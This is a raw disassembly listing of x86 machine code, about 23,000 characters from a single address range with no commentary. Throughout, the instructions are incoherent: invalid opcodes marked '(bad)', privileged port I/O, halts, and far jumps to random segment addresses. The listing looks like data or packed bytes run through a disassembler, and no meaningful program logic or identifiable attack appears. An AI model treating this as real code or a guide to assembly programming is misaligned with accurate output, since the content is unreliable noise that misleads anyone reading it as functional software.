  4097e4:	adc    DWORD PTR [edi+0x7fb66c51],eax
  4097ea:	popa   
  4097eb:	retf   
  4097ec:	enter  0x3f70,0xa4
  4097f0:	xchg   ecx,eax
  4097f1:	(bad)  
  4097f2:	ror    ecx,1
  4097f4:	cdq    
  4097f5:	sti    
  4097f6:	out    dx,eax
  4097f7:	call   0xd658:0x72d624c1
  4097fe:	push   esp
  4097ff:	lahf   
  409800:	or     ebx,DWORD PTR [ecx-0x24]
  409803:	xor    ch,bh
  409805:	mov    ebx,DWORD PTR [ebx]
  409807:	inc    eax
  409808:	jle    0x409791
  40980a:	dec    ebp
  40980b:	test   esi,0xa57f5797
  409811:	push   cs
  409812:	push   0x99eef78
  409817:	pushf  
  409818:	mov    edi,edi
  40981a:	(bad)  
  40981b:	xchg   edi,eax
  40981c:	add    al,0x88
  40981e:	push   eax
  40981f:	sbb    BYTE PTR [edi-0x1d81929f],0xa1
  409826:	retf   0xfafb
  409829:	ret    0xcf7a
  40982c:	cmp    BYTE PTR [edx+0x1d],ch
  40982f:	lods   al,BYTE PTR ds:[esi]
  409830:	xor    al,0xf6
  409832:	jno    0x40989f
  409834:	jmp    0xe5bf:0xc29a8561
  40983b:	imul   ebp,DWORD PTR [eax+edx*2+0xc0631b6],0x8ba2887a
  409846:	arpl   si,di
  409848:	mov    bl,0x55
  40984a:	and    edx,DWORD PTR [edi-0x33]
  40984d:	std    
  40984e:	loopne 0x4098a0
  409850:	pop    ds
  409851:	fimul  DWORD PTR ds:0xf8e07203
  409857:	or     cl,BYTE PTR [edi+0x4e]
  40985a:	daa    
  40985b:	(bad)  
  40985c:	and    al,BYTE PTR [ecx]
  40985e:	ss cdq 
  409860:	and    DWORD PTR fs:[ebp-0x4842c6b1],edi
  409867:	push   esp
  409868:	(bad)  
  409869:	in     al,dx
  40986a:	fadd   QWORD PTR [eax+0x6579ff88]
  409870:	sub    BYTE PTR ds:0xef857947,dh
  409876:	test   BYTE PTR [edx+0xde8c20f],0xad
  40987d:	jb     0x409843
  40987f:	dec    esp
  409880:	aaa    
  409881:	pop    ebx
  409882:	and    al,BYTE PTR [edi+ebp*1]
  409885:	(bad)  
  409886:	fbstp  TBYTE PTR [edi]
  409888:	sbb    ch,BYTE PTR [ebx-0x6b0058c6]
  40988e:	inc    esi
  40988f:	pushf  
  409890:	stos   DWORD PTR es:[edi],eax
  409891:	fmul   DWORD PTR [ebp+0x3cadf658]
  409897:	mov    ch,0xf5
  409899:	or     bl,BYTE PTR [ecx]
  40989b:	out    dx,al
  40989c:	xchg   edx,eax
  40989d:	push   0x82f84b83
  4098a2:	mov    eax,ds:0x54137659
  4098a7:	inc    ecx
  4098a8:	dec    esp
  4098a9:	and    ah,al
  4098ab:	std    
  4098ac:	test   eax,0x4f0639eb
  4098b1:	je     0x409900
  4098b3:	loope  0x4098c2
  4098b5:	(bad)  
  4098b6:	mov    ds:0x2c0ae67,eax
  4098bb:	mov    ds:0x95f9a1c4,eax
  4098c0:	mov    ebx,0x32b4df5f
  4098c5:	sub    eax,0xc570b6d4
  4098ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098cb:	rcr    DWORD PTR [edx],1
  4098cd:	push   ss
  4098ce:	sbb    al,0x12
  4098d0:	cli    
  4098d1:	sbb    DWORD PTR [edi+0x6a],edx
  4098d4:	popa   
  4098d5:	jg     0x4098b4
  4098d7:	stc    
  4098d8:	mov    edx,0x68475ddd
  4098dd:	mov    bh,0xdd
  4098df:	dec    ebp
  4098e0:	pop    ecx
  4098e1:	push   0xffffff92
  4098e3:	jne    0x40987b
  4098e5:	add    eax,0x602362d4
  4098ea:	in     eax,dx
  4098eb:	test   DWORD PTR [eax-0x4fd3de8e],eax
  4098f1:	mov    eax,ds:0x6de04e97
  4098f6:	mov    ch,0x4d
  4098f8:	sbb    dl,cl
  4098fa:	pusha  
  4098fb:	add    BYTE PTR [ebp*2-0x45f7f1a6],dl
  409902:	aaa    
  409903:	lods   eax,DWORD PTR ds:[esi]
  409905:	add    DWORD PTR [edi-0x70],ecx
  409908:	adc    ebp,edx
  40990a:	mov    eax,0xdfbaa761
  40990f:	aas    
  409910:	jge    0x4098b6
  409912:	out    0xa8,eax
  409914:	push   es
  409915:	mov    ch,0x99
  409917:	pop    eax
  409918:	hlt    
  409919:	pop    ds
  40991a:	or     al,0x16
  40991c:	dec    ecx
  40991d:	cmp    ah,al
  40991f:	xor    bl,cl
  409921:	push   edi
  409922:	push   esp
  409923:	aas    
  409924:	je     0x40991b
  409926:	xor    edi,DWORD PTR [ebx+0x7e]
  409929:	loope  0x409929
  40992b:	lar    esi,WORD PTR [eax-0x32]
  40992f:	outs   dx,DWORD PTR ds:[esi]
  409930:	sbb    al,BYTE PTR [edi]
  409932:	psrld  mm3,QWORD PTR [eax]
  409935:	jmp    0x740d39fe
  40993a:	mov    al,ds:0x5fd4e020
  40993f:	pusha  
  409940:	mov    edi,0xfb9ec658
  409945:	out    dx,eax
  409946:	icebp  
  409947:	rcr    DWORD PTR [edx-0x4],0xaa
  40994b:	scas   al,BYTE PTR es:[edi]
  40994c:	push   ds
  40994d:	push   esi
  40994e:	mov    al,0xa
  409950:	retf   0x686d
  409953:	mov    bh,0xeb
  409955:	push   ebx
  409956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409957:	stc    
  409958:	cmp    ecx,DWORD PTR [ebx+0x4077ff2e]
  40995e:	mov    edx,0x3ebb81ec
  409963:	scas   al,BYTE PTR es:[edi]
  409964:	xchg   ebx,eax
  409965:	jbe    0x4099d4
  409967:	test   BYTE PTR [esi],al
  409969:	lods   al,BYTE PTR ds:[esi]
  40996a:	push   0xffffffbe
  40996c:	jl     0x409943
  40996e:	fwait
  40996f:	mov    eax,0xc09c8301
  409974:	pop    es
  409975:	mov    esp,0x341365c3
  40997a:	pop    edi
  40997b:	rcl    BYTE PTR [ecx],1
  40997d:	jge    0x4099ea
  40997f:	push   ds
  409980:	jmp    0x9de0:0x7c437dcc
  409987:	lds    eax,FWORD PTR [ebx+0x44]
  40998a:	mov    fs,esi
  40998c:	xchg   esi,eax
  40998d:	retf   0xda46
  409990:	inc    edi
  409991:	dec    DWORD PTR [esi]
  409993:	xor    DWORD PTR [ecx+0x1c],ebx
  409996:	add    eax,0x89a30f7d
  40999b:	aad    0xa
  40999d:	xlat   BYTE PTR ds:[ebx]
  40999e:	inc    edi
  40999f:	sar    al,1
  4099a1:	or     BYTE PTR [esi],ch
  4099a3:	cs hlt 
  4099a5:	imul   ebx
  4099a7:	xchg   edx,eax
  4099a8:	fwait
  4099a9:	mov    edx,0x9a457d75
  4099ae:	adc    cl,0xe1
  4099b1:	sbb    al,0x38
  4099b3:	adc    eax,0x50a68aa0
  4099b8:	mov    bl,BYTE PTR [esi+0x5ccdbb9a]
  4099be:	outs   dx,DWORD PTR ds:[esi]
  4099bf:	aad    0xc4
  4099c1:	outs   dx,DWORD PTR ds:[esi]
  4099c2:	scas   al,BYTE PTR es:[edi]
  4099c3:	test   BYTE PTR [esp+ebx*8+0x7e],0xd4
  4099c8:	adc    al,0xbd
  4099ca:	mul    DWORD PTR [ebp+0x1f]
  4099cd:	add    eax,DWORD PTR [ebx+ecx*2+0x2fe6d6dd]
  4099d4:	push   0xffffffd6
  4099d6:	loope  0x409974
  4099d8:	data16 jle 0x409978
  4099db:	(bad)  
  4099dc:	jmp    0x31d1:0x311f4d0c
  4099e3:	and    eax,0x9f63868e
  4099e8:	xchg   ch,dh
  4099ea:	hlt    
  4099eb:	pop    ebx
  4099ec:	mov    ecx,ebx
  4099ee:	loop   0x4099f2
  4099f0:	inc    edi
  4099f1:	fild   WORD PTR [edi+0x78e81bdf]
  4099f7:	out    0xaf,al
  4099f9:	ins    DWORD PTR es:[edi],dx
  4099fa:	clc    
  4099fb:	mov    ebp,eax
  4099fd:	(bad)  
  4099ff:	or     ebx,DWORD PTR [esi+eax*8-0xa0d3b69]
  409a06:	aas    
  409a07:	sbb    al,0xb7
  409a09:	leave  
  409a0a:	inc    edx
  409a0b:	and    al,BYTE PTR [ebx]
  409a0d:	push   ebp
  409a0e:	out    dx,al
  409a0f:	add    ecx,DWORD PTR [ecx]
  409a11:	jmp    0x36fd:0x68268d3b
  409a18:	aam    0xbb
  409a1a:	inc    eax
  409a1b:	xlat   BYTE PTR ds:[ebx]
  409a1c:	ja     0x4099de
  409a1e:	mov    edx,0xbae56db8
  409a23:	xlat   BYTE PTR ds:[ebx]
  409a24:	fldcw  WORD PTR [esi+0x50]
  409a27:	cli    
  409a28:	push   cs
  409a29:	fild   DWORD PTR [eax+0x2af351f5]
  409a2f:	es push ebp
  409a31:	mov    ch,0xa2
  409a33:	mov    esi,0xe3fefff0
  409a38:	fld    DWORD PTR [esi+0x4fe21056]
  409a3e:	shr    BYTE PTR [eax-0x52],1
  409a41:	inc    ecx
  409a42:	lahf   
  409a43:	js     0x4099f5
  409a45:	adc    dl,BYTE PTR [edx]
  409a47:	adc    DWORD PTR [esi+0x6cde1113],0xf1bb226f
  409a51:	ins    BYTE PTR es:[edi],dx
  409a52:	and    edx,0x65711660
  409a58:	and    al,0x1d
  409a5a:	push   ss
  409a5b:	icebp  
  409a5c:	xchg   ebp,eax
  409a5d:	nop
  409a5e:	outs   dx,DWORD PTR ds:[esi]
  409a5f:	iret   
  409a60:	pop    ss
  409a61:	ja     0x4099ec
  409a63:	cmc    
  409a64:	mov    ecx,0xf242970d
  409a69:	jns    0x409a51
  409a6b:	jnp    0x409a66
  409a6d:	xchg   edi,eax
  409a6e:	shl    BYTE PTR [eax+0x6],1
  409a71:	daa    
  409a72:	mov    ecx,ebp
  409a74:	xor    BYTE PTR [ebp+0x45],al
  409a77:	push   ecx
  409a78:	cmc    
  409a79:	pusha  
  409a7a:	mov    dl,0x56
  409a7c:	pop    edx
  409a7d:	popa   
  409a7e:	sub    BYTE PTR [esi],ah
  409a80:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  409a82:	clc    
  409a83:	es pop esi
  409a85:	inc    ebx
  409a86:	mov    ah,0x9b
  409a88:	sahf   
  409a89:	imul   edx,DWORD PTR ds:0x283af47e,0x929135aa
  409a93:	loop   0x409a28
  409a95:	loopne 0x409a7c
  409a97:	ja     0x409aca
  409a99:	xor    eax,esp
  409a9b:	pop    ss
  409a9c:	and    al,BYTE PTR [esi+0x8]
  409a9f:	cmp    dl,bl
  409aa1:	aaa    
  409aa2:	lods   al,BYTE PTR ds:[esi]
  409aa3:	out    0xbb,eax
  409aa5:	adc    DWORD PTR [ecx+0x63],esi
  409aa8:	inc    ebp
  409aa9:	retf   0x74f1
  409aac:	inc    esi
  409aad:	(bad)  
  409aaf:	xor    dl,BYTE PTR [edx+eiz*2+0x6f550104]
  409ab6:	add    DWORD PTR [ecx+0x20d56e05],ebx
  409abc:	scas   eax,DWORD PTR es:[edi]
  409abd:	mov    al,ds:0x648c8733
  409ac2:	out    0x93,al
  409ac4:	call   0xf827:0x632d40c6
  409acb:	hlt    
  409acc:	push   0x733da83e
  409ad1:	mov    bh,0x98
  409ad3:	fidivr WORD PTR [edx]
  409ad5:	sub    eax,0xad7b671d
  409ada:	inc    esi
  409adb:	lea    ebp,[ecx]
  409add:	pushf  
  409ade:	lea    edx,[ebx+0x38]
  409ae1:	or     BYTE PTR [ecx-0x39],ah
  409ae4:	cwde   
  409ae5:	cmp    dl,BYTE PTR [edi+edi*4+0x59]
  409ae9:	pcmpgtd mm6,mm7
  409aec:	jmp    0x88e0:0xc3bcafb3
  409af3:	lock mov esi,0x8f9defc6
  409af9:	ret    
  409afa:	pop    ss
  409afb:	add    BYTE PTR ds:0x8e632175,ch
  409b01:	mov    cs,ecx
  409b03:	or     DWORD PTR [esi-0x5f],0x728cb100
  409b0a:	repnz push ebx
  409b0c:	pop    eax
  409b0d:	inc    esp
  409b0e:	mov    bl,0xf9
  409b10:	xchg   edx,eax
  409b11:	xlat   BYTE PTR ds:[ebx]
  409b12:	pop    esp
  409b13:	retw   0x2d53
  409b17:	aas    
  409b18:	and    ebx,DWORD PTR [edx]
  409b1a:	sbb    esi,DWORD PTR [edi+0x3714e24e]
  409b20:	pushf  
  409b21:	xchg   esp,eax
  409b22:	loop   0x409ad4
  409b24:	arpl   WORD PTR [eax+edx*1+0x73],dx
  409b28:	lods   al,BYTE PTR ds:[esi]
  409b29:	push   edx
  409b2a:	sbb    edx,DWORD PTR [ecx+0x6d]
  409b2d:	cmc    
  409b2e:	jmp    0x409b2e
  409b30:	pop    esp
  409b31:	and    BYTE PTR [esp+edi*8+0x43],dh
  409b35:	pop    ebx
  409b36:	pop    es
  409b37:	sub    eax,0xe1d0d864
  409b3c:	cmp    DWORD PTR [ebp-0x688c938b],esp
  409b42:	or     eax,0x6fa5f700
  409b47:	rcl    DWORD PTR [ecx],1
  409b49:	jg     0x409b7f
  409b4b:	adc    eax,0xd2f6961e
  409b50:	sub    BYTE PTR [ebp+0x6f],0xe2
  409b54:	add    ebx,DWORD PTR [edi]
  409b56:	pop    esp
  409b57:	rol    ecx,0x5a
  409b5a:	rcr    DWORD PTR [edx+0x69],1
  409b5d:	mov    bh,0x7e
  409b5f:	clc    
  409b60:	inc    esp
  409b61:	shl    BYTE PTR [eax+0x4b],0x7e
  409b65:	and    bl,bh
  409b67:	adc    BYTE PTR [eax+edx*8+0x28],dh
  409b6b:	gs call 0xa882:0xbdd73051
  409b73:	ins    BYTE PTR es:[edi],dx
  409b74:	shr    edi,cl
  409b76:	mov    ebp,0x3185a4e
  409b7b:	ins    BYTE PTR es:[edi],dx
  409b7c:	jno    0x409b5d
  409b7e:	mov    eax,DWORD PTR [edi+0x54]
  409b81:	push   0x4948d5f
  409b86:	es test eax,0xb5d646ba
  409b8c:	das    
  409b8d:	lock (bad) 
  409b8f:	pop    ebp
  409b90:	push   esi
  409b91:	rcr    ch,1
  409b93:	scas   al,BYTE PTR es:[edi]
  409b94:	in     eax,dx
  409b95:	idiv   BYTE PTR [ebp-0x59c631c1]
  409b9b:	push   eax
  409b9c:	add    BYTE PTR ds:0xf5993951,ah
  409ba2:	lock (bad) 
  409ba4:	in     eax,dx
  409ba5:	xor    al,0x73
  409ba7:	mov    bl,0x7e
  409ba9:	sbb    BYTE PTR [edx+ebx*1-0x69abecf1],cl
  409bb0:	jge    0x409bb9
  409bb2:	aas    
  409bb3:	pop    es
  409bb4:	jae    0x409b45
  409bb6:	sti    
  409bb7:	cwde   
  409bb8:	adc    DWORD PTR [ebx-0x13],0xe8a5c3d0
  409bbf:	shl    BYTE PTR [edx-0x2b],0xc3
  409bc3:	dec    esp
  409bc4:	jnp    0x409bf9
  409bc6:	add    eax,0x8414aa8
  409bcb:	mov    al,0x36
  409bcd:	lds    edx,FWORD PTR [edx-0x111917ab]
  409bd3:	jge    0x409b67
  409bd5:	retf   
  409bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd7:	aas    
  409bd8:	and    eax,0xd1ab8848
  409bdd:	call   0xa0e7:0x212491f6
  409be4:	js     0x409bf3
  409be6:	inc    ebx
  409be7:	fcomp  st(1)
  409be9:	lds    ecx,FWORD PTR [edi+0x4819db7e]
  409bef:	int    0xc2
  409bf1:	sbb    BYTE PTR ds:0x5954c820,cl
  409bf7:	mov    ecx,0x465ab062
  409bfc:	mov    edi,DWORD PTR [ecx-0x69]
  409bff:	mov    dl,0x83
  409c01:	xor    eax,0x52bde9a8
  409c06:	pop    ds
  409c07:	mov    bl,0x93
  409c09:	inc    edx
  409c0a:	fisub  DWORD PTR [edx+0x7c199310]
  409c10:	jns    0x409c74
  409c12:	out    0x2e,eax
  409c14:	loop   0x409c03
  409c16:	out    0x2a,al
  409c18:	jnp    0x409c42
  409c1a:	inc    edx
  409c1b:	lahf   
  409c1c:	mov    dh,0xeb
  409c1e:	cmp    dl,BYTE PTR [eax+0x5]
  409c21:	mov    DWORD PTR [ebx-0x3d],ecx
  409c24:	inc    eax
  409c25:	xchg   esi,eax
  409c26:	sub    DWORD PTR [ecx],ecx
  409c28:	pop    esi
  409c29:	cmp    al,0x57
  409c2b:	or     dl,BYTE PTR [eax-0x1]
  409c2e:	mov    DWORD PTR [edi+0xa],edi
  409c31:	fwait
  409c32:	je     0x409be7
  409c34:	adc    ch,BYTE PTR [eax+0x7]
  409c37:	cmp    ah,BYTE PTR [edi]
  409c39:	inc    edi
  409c3a:	ins    BYTE PTR es:[edi],dx
  409c3b:	jae    0x409c4e
  409c3d:	lea    esp,[ebx]
  409c3f:	and    al,0x50
  409c41:	jb     0x409c44
  409c43:	adc    edx,esi
  409c45:	lods   al,BYTE PTR ds:[esi]
  409c46:	mov    ebx,DWORD PTR [ebp-0x54]
  409c49:	ja     0x409c90
  409c4b:	not    DWORD PTR [ecx+0xf]
  409c4e:	push   0xf714d123
  409c53:	call   0x5c92fca9
  409c58:	sub    eax,0x9020e31f
  409c5d:	cmp    cl,BYTE PTR [eax+ebx*8]
  409c60:	xlat   BYTE PTR ds:[ebx]
  409c61:	out    0xeb,eax
  409c63:	jecxz  0x409ca4
  409c65:	(bad)  
  409c66:	les    ebp,FWORD PTR [ebx]
  409c68:	pop    eax
  409c69:	adc    BYTE PTR ds:0xbcc757f2,cl
  409c6f:	cmc    
  409c70:	push   eax
  409c71:	popa   
  409c72:	into   
  409c73:	push   ecx
  409c74:	jecxz  0x409c6b
  409c76:	shl    cl,0xc0
  409c79:	push   cs
  409c7a:	out    0x1b,al
  409c7c:	dec    esp
  409c7d:	sub    al,0xef
  409c7f:	xlat   BYTE PTR ds:[ebx]
  409c80:	pop    edx
  409c81:	popa   
  409c82:	rcr    DWORD PTR [eax+0x7],cl
  409c85:	ret    0xf736
  409c88:	test   DWORD PTR ds:0x4ee802ea,edx
  409c8e:	fwait
  409c8f:	pop    eax
  409c90:	sub    DWORD PTR [ecx+0x44fc132b],edi
  409c96:	pop    ebx
  409c97:	inc    ecx
  409c98:	aam    0x5a
  409c9a:	(bad)  
  409c9b:	xor    eax,DWORD PTR [ebx]
  409c9d:	sar    BYTE PTR ds:0x83218707,0xc6
  409ca4:	push   0x1a
  409ca6:	out    0x31,al
  409ca8:	sahf   
  409ca9:	push   ss
  409caa:	or     DWORD PTR [edi],eax
  409cac:	add    BYTE PTR es:[ecx+0xde70b26],dh
  409cb3:	pop    esp
  409cb4:	js     0x409cb5
  409cb6:	sbb    eax,0xccda52fb
  409cbb:	push   eax
  409cbc:	fld    QWORD PTR [ecx]
  409cbe:	stos   DWORD PTR es:[edi],eax
  409cbf:	fs iret 
  409cc1:	mov    dl,0x78
  409cc3:	test   al,0xae
  409cc5:	sbb    edi,ebp
  409cc7:	rcl    DWORD PTR [ebx-0x3b0b16eb],cl
  409ccd:	jge    0x409c88
  409ccf:	das    
  409cd0:	jp     0x409d3c
  409cd2:	fdivr  DWORD PTR [bp+di]
  409cd5:	pop    esp
  409cd6:	or     ecx,edi
  409cd8:	jl     0x409c6d
  409cda:	push   ecx
  409cdb:	into   
  409cdc:	stos   DWORD PTR es:[edi],eax
  409cdd:	loopne 0x409c9b
  409cdf:	adc    esp,DWORD PTR [edx-0x35]
  409ce2:	or     edi,DWORD PTR [eax+0x3141953f]
  409ce8:	imul   ebp,edx,0x1a
  409ceb:	jbe    0x409c7b
  409ced:	mov    ds:0x44a06554,eax
  409cf2:	mov    es,eax
  409cf4:	mov    ds:0xc84e03d4,eax
  409cf9:	rcr    DWORD PTR [ebp+0x73],cl
  409cfc:	push   ebp
  409cfd:	mov    al,ds:0xb6ef4c9d
  409d02:	mov    ch,0x5d
  409d04:	cmp    BYTE PTR [eax*8-0x4bea983],bh
  409d0b:	pop    edx
  409d0c:	stc    
  409d0d:	loope  0x409cbb
  409d0f:	push   ds
  409d10:	inc    edx
  409d11:	in     eax,dx
  409d12:	push   esi
  409d13:	hlt    
  409d14:	sub    edx,DWORD PTR [esi-0x706f6db6]
  409d1a:	pop    ss
  409d1b:	fstp   st(7)
  409d1d:	push   ebp
  409d1e:	add    eax,0x228317a8
  409d23:	lock mov edx,0x81017844
  409d29:	iret   
  409d2a:	xlat   BYTE PTR ds:[ebx]
  409d2b:	fbstp  TBYTE PTR [ebx]
  409d2d:	xor    esp,ebx
  409d2f:	xlat   BYTE PTR ds:[ebx]
  409d30:	xor    eax,0x1534e114
  409d35:	pushf  
  409d36:	bound  eax,QWORD PTR [ecx]
  409d38:	out    dx,al
  409d39:	jmp    0x409d68
  409d3b:	sub    eax,0xed2b8191
  409d40:	(bad)  
  409d41:	xchg   ebp,eax
  409d42:	aas    
  409d43:	(bad)  
  409d44:	dec    eax
  409d45:	dec    esp
  409d46:	mov    ebp,0xc8c9a8f
  409d4b:	mov    bh,0x5
  409d4d:	mov    esp,0x42eb4005
  409d52:	iret   
  409d53:	sbb    eax,0x89681bdd
  409d58:	retf   
  409d59:	push   edx
  409d5a:	int3   
  409d5b:	mov    edi,0x491d0f0e
  409d60:	popa   
  409d61:	pop    es
  409d62:	adc    dl,0xa8
  409d65:	dec    eax
  409d66:	int3   
  409d67:	or     DWORD PTR [esi-0xafe0232],esp
  409d6d:	adc    BYTE PTR [ebx],al
  409d6f:	mov    esi,0x80f61486
  409d74:	push   cs
  409d75:	test   al,0xec
  409d77:	jno    0x409d5d
  409d79:	cmp    esi,DWORD PTR [ecx]
  409d7b:	mov    ds:0x4aa78f03,al
  409d80:	cmp    DWORD PTR [ecx],eax
  409d82:	cmp    esp,edx
  409d84:	cmp    bl,dh
  409d86:	ja     0x409d7d
  409d88:	or     dl,dh
  409d8a:	pslld  mm6,QWORD PTR [ecx]
  409d8d:	inc    ebp
  409d8e:	loope  0x409d93
  409d90:	mov    edx,cr5
  409d93:	cmp    bl,BYTE PTR [eax+0x47]
  409d96:	and    DWORD PTR ds:0x13bac05,ebx
  409d9c:	fnstcw WORD PTR [ebp+0x9bd14a0]
  409da2:	mov    bh,0x72
  409da4:	xchg   DWORD PTR [esi-0x53],esp
  409da7:	imul   esi,DWORD PTR [esi+0x110ef691],0x50d95396
  409db1:	lea    esi,[ebx+esi*8-0x35e887c3]
  409db8:	addr16 into 
  409dba:	sub    al,bh
  409dbc:	mov    al,ds:0x69d821dc
  409dc1:	arpl   cx,bx
  409dc3:	lods   eax,DWORD PTR ds:[esi]
  409dc4:	push   esp
  409dc5:	jnp    0x409da7
  409dc7:	mov    ch,0x78
  409dc9:	outs   dx,DWORD PTR ds:[esi]
  409dca:	cmp    DWORD PTR [edx-0x7c],esi
  409dcd:	mov    dh,0xdf
  409dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dd0:	lea    ebp,[eax-0x3d]
  409dd3:	les    edi,FWORD PTR [eax-0x5]
  409dd6:	cmp    ch,dl
  409dd8:	jnp    0x409db7
  409dda:	(bad)  [esi]
  409ddc:	jg     0x409dc0
  409dde:	inc    eax
  409ddf:	push   ebx
  409de0:	dec    edi
  409de1:	test   DWORD PTR [eax+0x6b],esi
  409de4:	jb     0x409e16
  409de6:	scas   eax,DWORD PTR es:[edi]
  409de7:	ins    BYTE PTR es:[edi],dx
  409de8:	inc    esi
  409de9:	jmp    0x409ddf
  409deb:	xor    esp,DWORD PTR [ebp-0x5f]
  409dee:	cmc    
  409def:	sub    dl,bh
  409df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409df2:	imul   edi,esi,0x3953795
  409df8:	pop    ds
  409df9:	adc    DWORD PTR [ebx+0xa905e39],esp
  409dff:	daa    
  409e00:	mov    esi,0x40346b2f
  409e05:	sub    BYTE PTR [esi],al
  409e07:	shr    edx,0x9d
  409e0a:	jmp    0x174:0x34105550
  409e11:	pop    eax
  409e12:	sub    ebx,DWORD PTR [ebx+0x11aafa01]
  409e18:	push   edx
  409e19:	inc    esp
  409e1a:	mov    esp,0xc85bffc8
  409e20:	pop    edx
  409e21:	les    edx,FWORD PTR [ecx+ecx*8+0x673ef4c4]
  409e28:	jl     0x409e26
  409e2a:	das    
  409e2b:	popa   
  409e2c:	adc    BYTE PTR [esi-0x5b31b14b],dh
  409e32:	sahf   
  409e33:	out    0x90,al
  409e35:	lahf   
  409e36:	lods   eax,DWORD PTR ds:[esi]
  409e37:	pop    ebp
  409e38:	clc    
  409e39:	and    edi,DWORD PTR [ebp+esi*2-0x759f610f]
  409e40:	pop    ecx
  409e41:	bound  ecx,QWORD PTR [esi-0x5e]
  409e44:	stos   DWORD PTR es:[edi],eax
  409e45:	mov    ah,dh
  409e47:	pop    esi
  409e48:	js     0x409e87
  409e4a:	(bad)  
  409e4b:	mov    ds:0xfb40b519,al
  409e50:	fs xchg esp,eax
  409e52:	das    
  409e53:	out    0x2,eax
  409e55:	inc    esi
  409e56:	mov    ds,WORD PTR [ecx-0x35059bfe]
  409e5c:	mov    al,ds:0x60db8b43
  409e61:	nop
  409e62:	mov    cl,0x94
  409e64:	mov    edx,0x8d6ff257
  409e69:	(bad)  
  409e6a:	std    
  409e6b:	cwde   
  409e6c:	das    
  409e6d:	push   ebx
  409e6e:	popf   
  409e6f:	cmp    DWORD PTR [eax+0xb10b75f],0xfffffff7
  409e76:	mov    dl,0x3b
  409e78:	jle    0x409e12
  409e7a:	ds add al,0x88
  409e7d:	nop
  409e7e:	sbb    al,0xc3
  409e80:	fist   WORD PTR [ecx]
  409e82:	je     0x409e5a
  409e84:	mov    dh,0xc1
  409e86:	inc    eax
  409e87:	lock cli 
  409e89:	out    0xd1,al
  409e8b:	xor    ecx,DWORD PTR [eax]
  409e8d:	jle    0x409ebe
  409e8f:	nop    DWORD PTR [ebx-0x27daee05]
  409e96:	mov    cl,0x13
  409e98:	and    BYTE PTR [eax+0x697bdf03],bh
  409e9e:	lahf   
  409e9f:	mov    ah,0x86
  409ea1:	jmp    0x420112ad
  409ea6:	iret   
  409ea7:	cs push ecx
  409ea9:	(bad)  
  409eaa:	(bad)  
  409eab:	dec    edi
  409eac:	(bad)  
  409eae:	add    ebx,DWORD PTR [ebp+edx*1-0x284c4b0f]
  409eb5:	xchg   DWORD PTR [ebx+0x755a24f7],esp
  409ebb:	les    esp,FWORD PTR [ecx-0x66c2018f]
  409ec1:	jle    0x409e51
  409ec3:	jg     0x409e9a
  409ec5:	retf   
  409ec6:	xor    al,0xe9
  409ec8:	jle    0x409e7b
  409eca:	adc    edx,DWORD PTR [esi]
  409ecc:	sub    DWORD PTR [edx+edx*1],0x2
  409ed0:	inc    ebx
  409ed1:	xor    ebx,DWORD PTR [ebx+0x2a]
  409ed4:	xor    DWORD PTR [ebx+0x51],esi
  409ed7:	cmp    al,dl
  409ed9:	std    
  409eda:	out    0xa8,eax
  409edc:	mov    BYTE PTR [ebp+0x62],ch
  409edf:	int    0x5a
  409ee1:	adc    al,0xf0
  409ee3:	dec    esi
  409ee4:	sahf   
  409ee5:	mov    al,0x5f
  409ee7:	fmul   DWORD PTR ds:0xec459f6
  409eed:	lods   eax,DWORD PTR ds:[esi]
  409eee:	inc    esi
  409eef:	inc    esp
  409ef0:	or     ecx,DWORD PTR [ebp+0x3]
  409ef3:	fst    QWORD PTR [edi+esi*8-0x19]
  409ef7:	push   edi
  409ef8:	(bad)  
  409efa:	adc    eax,0x9446061
  409eff:	push   edi
  409f00:	je     0x409f21
  409f02:	fs stos DWORD PTR es:[edi],eax
  409f04:	or     esi,DWORD PTR [esi-0x1a]
  409f07:	jg     0x409f02
  409f09:	xlat   BYTE PTR ds:[ebx]
  409f0a:	cmp    eax,0x8df7b56f
  409f0f:	loope  0x409e9d
  409f11:	call   0x5688:0xe11614bc
  409f18:	jb     0x409f94
  409f1a:	icebp  
  409f1b:	repnz or eax,0x3c1cacca
  409f21:	pop    edi
  409f22:	cmp    al,cl
  409f24:	clc    
  409f25:	lods   eax,DWORD PTR ds:[esi]
  409f26:	or     BYTE PTR [ebx],bh
  409f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f29:	mov    WORD PTR [eax-0x6fdad1b],gs
  409f2f:	jmp    0x2124:0x45406041
  409f36:	push   cs
  409f37:	out    dx,al
  409f38:	cmp    al,0xba
  409f3a:	jno    0x409f7c
  409f3c:	shl    BYTE PTR [edx+eiz*8-0x7658f2c6],cl
  409f43:	cwde   
  409f44:	imul   esi,DWORD PTR [esi],0x9dc43971
  409f4a:	add    BYTE PTR [ecx+0xa],al
  409f4d:	sti    
  409f4e:	or     BYTE PTR [ecx+0x73],ah
  409f51:	cmp    eax,0xf08898a5
  409f56:	in     eax,dx
  409f57:	dec    eax
  409f58:	xor    eax,DWORD PTR [edi]
  409f5a:	mov    ch,bh
  409f5c:	jb     0x409f0a
  409f5e:	sbb    dl,BYTE PTR [edx+0x29]
  409f61:	in     al,dx
  409f62:	push   edi
  409f63:	mov    ebx,0x2aa4d973
  409f68:	push   es
  409f69:	xlat   BYTE PTR ds:[ebx]
  409f6a:	inc    ebx
  409f6b:	jge    0x409f47
  409f6d:	push   esp
  409f6e:	mov    eax,0x8e0e3f4f
  409f73:	sub    bh,al
  409f75:	and    eax,0x2b3f68c5
  409f7a:	xchg   esi,eax
  409f7b:	scas   eax,DWORD PTR es:[edi]
  409f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f7d:	xchg   ebp,eax
  409f7e:	inc    ebx
  409f7f:	(bad)  [eax-0x460f6276]
  409f85:	ret    
  409f86:	repz lea esi,[ecx+edx*4+0x54]
  409f8b:	(bad)  
  409f8d:	push   edi
  409f8e:	repnz pop esi
  409f90:	sub    al,0x32
  409f92:	add    eax,edx
  409f94:	not    DWORD PTR [edi-0x63]
  409f97:	scas   al,BYTE PTR es:[edi]
  409f98:	xor    ebx,DWORD PTR [eax]
  409f9a:	adc    al,0x1b
  409f9c:	push   ds
  409f9d:	out    0xae,eax
